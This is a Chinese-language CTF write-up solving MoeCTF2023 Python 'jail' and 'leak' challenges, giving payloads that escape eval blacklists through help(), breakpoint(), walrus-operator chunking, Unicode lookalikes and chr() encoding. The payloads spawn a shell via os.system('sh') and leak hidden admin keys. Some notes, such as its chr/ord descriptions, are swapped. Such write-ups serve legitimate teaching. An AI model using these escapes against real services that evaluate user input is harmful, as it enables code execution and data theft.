# Python Jail
### Author: 0xcafebabe

### 这个系列是我最感兴趣的，因为没接触过，0基础，所以我会写的很细！

### 介绍常用方法:
```
eval() -> 有返回值，不能赋值变量（除了:=运算符）

exec() -> 执行，无返回值，可以套在eval里面，可以赋值变量


_ 符号，代表上一次输入
_+"aaa"可以组合字符串


海象运算符，eval只能接受表达式
(a:="1")
(a:=a+"2")

-> a= "12"

长度6
help() --> 输入后，再输入os或者sys，这两个很容易造成字符溢出
溢出后可以输入!，获取sh

长度12
breakpoint()
查看变量: p <变量名>
运行并查看下一条指令 n
c 跑起来（退出调试模式）


dir()
vars()
输出所有的当前环境下的变量名字
globals() 获取全局变量key:value 键值对
locals()  获取局部变量
help() -> __main__

chr('x') -> 返回x的ascii码
ord(10) -> 返回ascii码10对应的字符
获取ascii码 -> x64dbg

Unicode绕过 http://shapecatcher.com/
ₑ
_ 非正常下划线不能在首字母


元组转string
[2::5]
意思是从index=2 开始，每五个字符获取一个
         索引
python的str,bytes....都是可以索引的iterable
for i in ssss:
	print(i)
	
当前目录
open("flag.txt").read()

bytes([115, 121, 115, 116, 101, 109]).decode()
"aaa".encode() ->编码成 bytes

13字符
exec(input())
eval(xxxxxxxx)

__import__("os").system("sh")


import os
# os = __import__("os")
os.system("sh")

可以加十六进制数
exec("\x70\x72\x69\x6e\x74\x28\x6f\x70\x65\x6e\x28\x22\x66\x61\x63\x74\x6f\x72\x2e\x6c\x6f\x67\x22\x29\x2e\x72\x65\x61\x64\x28\x29\x29")

pyjail 写脚本处理
```

---
## CHALLENGE: Jail Level 0
进入后输入g获取题目源码
```python
print("Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge.")
print("Enter your expression and I will evaluate it for you.")
user_input_data = input("> ")
print('calc Answer: {}'.format(eval(user_input_data)))
```

那么显然，input将会把用户输入的值放到eval里面，这是非常危险的，因为用户可以输入任何他们想要运行的值

### 方法1
直接拿下shell
```python
__import__("os").system("sh")
```

### 方法2
海象运算符
```python
(a:="__import__('os').system('sh')")
```
第二次进去，a变量的值会保存，那么输入exec(a)或者eval(a)都可以拿到shell

### 方法3
```python
breakpoint()
```
然后分别输入
```python
import os
os.system("sh")
```
就可以拿到flag


### 其他尝试
```
help()指令

注意：本题不能使用help指令，因为不会造成--more--
```

最后答案
```
flag{oipkuRO1O3wADvFe3lfIHrvGb3dWH4k-}
```

---

## CHALLENGE: Jail Level 1

题目给的
```python
print("Welcome to the MoeCTF2023 Jail challenge level1.It's time to work on this calc challenge.")
print("Enter your expression and I will evaluate it for you.")
user_input_data = input("> ")
if len(user_input_data)>12:
  print("Oh hacker! Bye~")
  exit(0)
print('calc Answer: {}'.format(eval(user_input_data)))
```

这个比上个题多了个检查，如果是13字符及以上就不给你做，所以我们采用下面方法

### 方法1
```python
breakpoint()
```
因为这个长度刚好是12，非常容易想到

### 方法2
海象运算符
```python
(a:='')
(a:=a+'__i')
(a:=a+'mpo')
(a:=a+'rt_')
(a:=a+'_("')
(a:=a+'os"')
(a:=a+').s')
(a:=a+'yst')
(a:=a+'em(')
(a:=a+'"sh')
(a:=a+'")')
eval(a)
```
我们可以让每个payload长度小于等于12，然后由此拿到shell

有人问了，为什么不直接a+=""，注意，eval里面只能含有表达式而不是语句！


---

## CHALLENGE: Jail Level 2

```python
print("Welcome to the MoeCTF2023 Jail challenge level1.It's time to work on this calc challenge.")
print("Enter your expression and I will evaluate it for you.")
user_input_data = input("> ")
if len(user_input_data)>6:
  print("Oh hacker! Bye~")
  exit(0)
print('calc Answer: {}'.format(eval(user_input_data)))
```

### 方法1
看到长度大于6，秒想到help()，结果真能用，直接过

---

## CHALLENGE: Jail Level 3
```python
    import re
    BANLIST = ['breakpoint']
    BANLIST_WORDS = '|'.join(f'({WORD})' for WORD in BANLIST)
    print("Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge.")
    print("Enter your expression and I will evaluate it for you.")
    user_input_data = input("> ")
    if len(user_input_data)>12:
      print("Oh hacker! Bye~")
      exit(0)
    if re.findall(BANLIST_WORDS, user_input_data, re.I):
      raise Exception('Blacklisted word detected! you are hacker!')
    print('Answer result: {}'.format(eval(user_input_data)))
```

这题上了正则表达式，限制不能大于12且不是breakpoint，那么：

### 方法1
海象运算符，同Jail Level2

### 方法2
使用非ascii码的brｅakpoint()，这里只需要更改e到ｅ就行了，拿到pdb后直接进行Jail Level0中的操作就行

---

## CHALLENGE: Jail Level 4
### 方法1
__import__("os").system("sh")

感觉这题如果放在其他地方会好一点，放在Python Jail了直接就会被秒了

---

## CHALLENGE: Leak Level 0
```python
    fake_key_into_local_but_valid_key_into_remote = "moectfisbestctfhopeyoulikethat"
    print("Hey Guys,Welcome to the moeleak challenge.Have fun!.")
    print("| Options: 
|       [V]uln 
|       [B]ackdoor")
    def func_filter(s):
      not_allowed = set('vvvveeee')
      return any(c in not_allowed for c in s)
    while(1):
      challenge_choice = input(">>> ").lower().strip()
      if challenge_choice == 'v':
        code = input("code >> ")
        if(len(code)>9):
          print("you're hacker!")
          exit(0)
        if func_filter(code):
          print("Oh hacker! byte~")
          exit(0)
        print(eval(code))
      elif challenge_choice == 'b':
        print("Please enter the admin key")
        key = input("key >> ")
        if(key == fake_key_into_local_but_valid_key_into_remote):
          print("Hey Admin,please input your code:")
          code = input("backdoor >> ")
          print(eval(code))
      else:
        print("You should select valid choice!")
```

这次我们的目标不是拿到shell，而是拿到程序里面藏的flag
```python
set('vvvveeee')
```

```
首先这个set，它实际上只禁用了v和e，防止我们使用vars()和help()

而且长度为9的限制也让你无法brｅakpoint()
```

### 方法1:
使用locals() 查看所有变量，直接拿下
```python
'key_6366a131649a4e9b': '4e86eda06366a131649a4e9be1a9f217'
```
之后进backdoor无限制进行输入即可!

### 方法2:
你禁用e，但是没有禁用hｅlp()啊！，我直接一手hｅlp()，然后输入__main__，那么
```python
DATA
    CHALLENGE_SOURCE_CODE = '\n    fake_key_into_local_but_valid_key_into_...
    WELCOME = '\n  __  __  ___       _      ______        _  __ ...       ...
    __annotations__ = {}
    challenge_choice = 'v'
    choice = 'e'
    code = 'hｅlp()'
    key_6366a131649a4e9b = '4e86eda06366a131649a4e9be1a9f217'
```
同样拿下

### 方法3:
你看看能不能用vars()?



---

## CHALLENGE: Jail Level 5

```python
    print("Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge.")
    print("Enter your expression and I will evaluate it for you.")
    def func_filter(s):
      not_allowed = set('"'`bid')
      return any(c in not_allowed for c in s)
    user_input_data = input("> ")
    if func_filter(user_input_data):
      print("Oh hacker! Bye~")
      exit(0)
    if not user_input_data.isascii():
      print("Sorry we only ascii for this chall!")
      exit(0)
    print('Answer result: {}'.format(eval(user_input_data)))
```

不能用" ' ` b i d  但是只能ASCII！
eval()

### 方法1:
速通pdb
```python
vars(vars()[(*vars(),)[([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])]])[(*vars(vars()[(*vars(),)[([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])]]),)[([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])]]()
```

### 方法2:
```python
eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(34)+chr(111)+chr(115)+chr(34)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(34)+chr(115)+chr(104)+chr(34)+chr(41))
```

## CHALLENGE: Leak Level 2:
```python
    fake_key_into_local_but_valid_key_into_remote = "moectfisbestctfhopeyoulikethat"
    print("Hey Guys,Welcome to the moeleak challenge.Have fun!.")
    print("| Options: 
|       [V]uln 
|       [B]ackdoor")
    def func_filter(s):
      not_allowed = set('dbtaaaaaaaaa!')
      return any(c in not_allowed for c in s)
    while(1):
      challenge_choice = input(">>> ").lower().strip()
      if challenge_choice == 'v':
        print("you need to ")
        code = input("code >> ")
        if(len(code)>6):
          print("you're hacker!")
          exit(0)
        if func_filter(code):
          print("Oh hacker! byte~")
          exit(0)
        if not code.isascii():
          print("please use ascii only thanks!")
          exit(0)
        print(eval(code))
      elif challenge_choice == 'b':
        print("Please enter the admin key")
        key = input("key >> ")
        if(key == fake_key_into_local_but_vailed_key_into_remote):
          print("Hey Admin,please input your code:")
          code = input("backdoor> ")
          print(eval(code))
      else:
        print("You should select valid choice!")
```

看着头晕目眩的

总结就是，不能用非ascii码，排除了!, a, t, b, d字符，输入长度不得大于6

#### 那么它给你关上一扇门，就会给你打开一扇窗
### 方法1:
参考Leak Level 0
```
你禁用e，但是没有禁用hｅlp()啊！，我直接一手hｅlp()，然后输入__main__
```

那么我们直接输入
```python
help()
```
然后__main__即可
```
DATA
    CHALLENGE_SOURCE_CODE = '\n    fake_key_into_local_but_valid_key_into_...
    WELCOME = '\n  __  __  ___       _      ______        _  __ ...       ...
    __annotations__ = {}
    challenge_choice = 'v'
    choice = 'e'
    code = 'help()'
    key_f5ee1754b2e73acf = '43610e2ef5ee1754b2e73acf35348dd5'
```
拿下！

---

## Jail Level 6

首先推荐看隔壁师傅的WP
```
vars(vars()[[*vars()][-9]])[[*vars(vars()[[*vars()][-9]])][12]]()
```

https://github.com/XDSEC/MoeCTF_2023/blob/main/WriteUps/constellation/Jail/Jail%20Level%201-6%20%26%20Leak%20Level%201-2%20%26%20PyRunner!.md#jail-level-3

这可以认为是方法1

题目源码
```python
    print("Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge.")
    print("Enter your expression and I will evaluate it for you.")
    def func_filter(s):
      not_allowed = set('"'`bic+')
      return any(c in not_allowed for c in s)
    user_input_data = input("> ")
    if func_filter(user_input_data):
      print("Oh hacker! Bye~")
      exit(0)
    if not user_input_data.isascii():
      print("Sorry we only ascii for this chall!")
      exit(0)
    print('Answer result: {}'.format(eval(user_input_data)))
```

不能用引号 b i c 和加号，必须是ascii，但是长度 -! 没有限制 !-

 - 这直接把chr()+xxx的方案彻底堵死
 - breakpoint()彻底堵死
 - locals()堵死
 - help() 没 堵死！

通过help查看__main__，我们可以发现CHALLENGE_SOURCE_CODE变量装有可以输出的源码
```python
DATA
    CHALLENGE_DESCRIPT = '\n\n||||||||||||||||||||||||||||||||||||||||||||...
    CHALLENGE_SOURCE_CODE = '\n    print("Welcome to the MoeCTF2023 Jail c...
    WELCOME = '\n  __  __  ___        _____        _        _   ...       ...
    __annotations__ = {}
    choice = 'e'
    user_input_data = 'help()'
```

那么我可以想到，是不是可以通过源码里面已经有的字符来拼接我的payload？？

苦思冥想后，通过输出找到了各个字符在此变量中的数组索引：
```python
__import__("os").system("sh")

_ 176
i 40
m 17
p 5
o 16
r 6
t 20
s 56
( 10
) 162
" 11
. 52
y 157
e 13
h 24

__import__("os").system("sh")
176 176 40 17 5 16 6 20 176 176 10 11 16 56 11 162 52 56 157 56 20 13 17 10  11 56 24 11 162

```

这下就好了，但是呢，禁了加号，我怎么把字符拼接起来呢？我想到了元组

```python
(CHALLENGE_SOURCE_CODE[176],CHALLENGE_SOURCE_CODE[176],CHALLENGE_SOURCE_CODE[176],CHALLENGE_SOURCE_CODE[40],CHALLENGE_SOURCE_CODE[17],CHALLENGE_SOURCE_CODE[5],CHALLENGE_SOURCE_CODE[16],CHALLENGE_SOURCE_CODE[6],CHALLENGE_SOURCE_CODE[20],CHALLENGE_SOURCE_CODE[176],CHALLENGE_SOURCE_CODE[176],CHALLENGE_SOURCE_CODE[10],CHALLENGE_SOURCE_CODE[11],CHALLENGE_SOURCE_CODE[16],CHALLENGE_SOURCE_CODE[56],CHALLENGE_SOURCE_CODE[11],CHALLENGE_SOURCE_CODE[162],CHALLENGE_SOURCE_CODE[52],CHALLENGE_SOURCE_CODE[56],CHALLENGE_SOURCE_CODE[157],CHALLENGE_SOURCE_CODE[56],CHALLENGE_SOURCE_CODE[20],CHALLENGE_SOURCE_CODE[13],CHALLENGE_SOURCE_CODE[17],CHALLENGE_SOURCE_CODE[10],CHALLENGE_SOURCE_CODE[11],CHALLENGE_SOURCE_CODE[56],CHALLENGE_SOURCE_CODE[24],CHALLENGE_SOURCE_CODE[11],CHALLENGE_SOURCE_CODE[162])
```

输出:
```python
Answer result: ('_', '_', '_', 'i', 'm', 'p', 'o', 'r', 't', '_', '_', '(', '"', 'o', 's', '"', ')', '.', 's', 'y', 's', 't', 'e', 'm', '(', '"', 's', 'h', '"', ')')
```

好像已经距离成功不远了！！。接下来我们str(元组)试试

输出
```python
Answer result: ('_', '_', '_', 'i', 'm', 'p', 'o', 'r', 't', '_', '_', '(', '"', 'o', 's', '"', ')', '.', 's', 'y', 's', 't', 'e', 'm', '(', '"', 's', 'h', '"', ')')
```

你可能会问这和刚刚有啥不一样？确实不一样，刚刚输出的是元组，这个输出的是元组转文本的值

那么下来的操作，我们从第7个索引开始，每5个字符拿一次，就是[7::5]

最后的payload就是:
```python
eval(str((CHALLENGE_SOURCE_CODE[176],CHALLENGE_SOURCE_CODE[176],CHALLENGE_SOURCE_CODE[176],CHALLENGE_SOURCE_CODE[40],CHALLENGE_SOURCE_CODE[17],CHALLENGE_SOURCE_CODE[5],CHALLENGE_SOURCE_CODE[16],CHALLENGE_SOURCE_CODE[6],CHALLENGE_SOURCE_CODE[20],CHALLENGE_SOURCE_CODE[176],CHALLENGE_SOURCE_CODE[176],CHALLENGE_SOURCE_CODE[10],CHALLENGE_SOURCE_CODE[11],CHALLENGE_SOURCE_CODE[16],CHALLENGE_SOURCE_CODE[56],CHALLENGE_SOURCE_CODE[11],CHALLENGE_SOURCE_CODE[162],CHALLENGE_SOURCE_CODE[52],CHALLENGE_SOURCE_CODE[56],CHALLENGE_SOURCE_CODE[157],CHALLENGE_SOURCE_CODE[56],CHALLENGE_SOURCE_CODE[20],CHALLENGE_SOURCE_CODE[13],CHALLENGE_SOURCE_CODE[17],CHALLENGE_SOURCE_CODE[10],CHALLENGE_SOURCE_CODE[11],CHALLENGE_SOURCE_CODE[56],CHALLENGE_SOURCE_CODE[24],CHALLENGE_SOURCE_CODE[11],CHALLENGE_SOURCE_CODE[162]))[7::5])

```

附：激动人心的时刻
```python
>>> e
Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge.
Enter your expression and I will evaluate it for you.
> eval(str((CHALLENGE_SOURCE_CODE[176],CHALLENGE_SOURCE_CODE[176],CHALLENGE_SOURCE_CODE[176],CHALLENGE_SOURCE_CODE[40],CHALLENGE_SOURCE_CODE[17],CHALLENGE_SOURCE_CODE[5],CHALLENGE_SOURCE_CODE[16],CHALLENGE_SOURCE_CODE[6],CHALLENGE_SOURCE_CODE[20],CHALLENGE_SOURCE_CODE[176],CHALLENGE_SOURCE_CODE[176],CHALLENGE_SOURCE_CODE[10],CHALLENGE_SOURCE_CODE[11],CHALLENGE_SOURCE_CODE[16],CHALLENGE_SOURCE_CODE[56],CHALLENGE_SOURCE_CODE[11],CHALLENGE_SOURCE_CODE[162],CHALLENGE_SOURCE_CODE[52],CHALLENGE_SOURCE_CODE[56],CHALLENGE_SOURCE_CODE[157],CHALLENGE_SOURCE_CODE[56],CHALLENGE_SOURCE_CODE[20],CHALLENGE_SOURCE_CODE[13],CHALLENGE_SOURCE_CODE[17],CHALLENGE_SOURCE_CODE[10],CHALLENGE_SOURCE_CODE[11],CHALLENGE_SOURCE_CODE[56],CHALLENGE_SOURCE_CODE[24],CHALLENGE_SOURCE_CODE[11],CHALLENGE_SOURCE_CODE[162]))[7::5])

ls
flag_53564aadf96c9fee
server.py
cat flag_53564aadf96c9fee
moectf{KvOsnWrTIeEmgymhFquOisY1No9WfIrM}
```